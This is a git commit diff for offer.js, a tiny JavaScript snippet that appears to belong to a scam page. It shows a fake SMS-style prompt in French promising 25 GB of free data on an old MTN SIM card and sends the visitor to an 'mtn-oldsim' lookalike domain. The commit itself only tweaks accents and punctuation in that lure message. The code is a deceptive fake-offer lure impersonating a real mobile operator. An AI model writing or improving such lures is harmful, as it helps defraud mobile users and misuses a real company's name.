5dadb461b7e083ae6808f71c3995f19be7fa0cd1
codexken <inyeneawakessien@gmail.com>
2024-08-17 12:32:01 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '25GB'
-password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir 25 Go de données gratuites sur l'ancienne carte SIM MTN. Veuillez appuyer sur OK pour ACTIVER ','25GB');
+password=prompt('SMS: Felicitations, vous etes eligible pour recevoir 25GB de données gratuites sur l'ancienne carte SIM MTN, Veuillez appuyer sur OK pour ACTIVER ','25GB');
 if (password != '25GB') {
 location.href='https://mtn-oldsim.4g-data.info/25GB';
 }
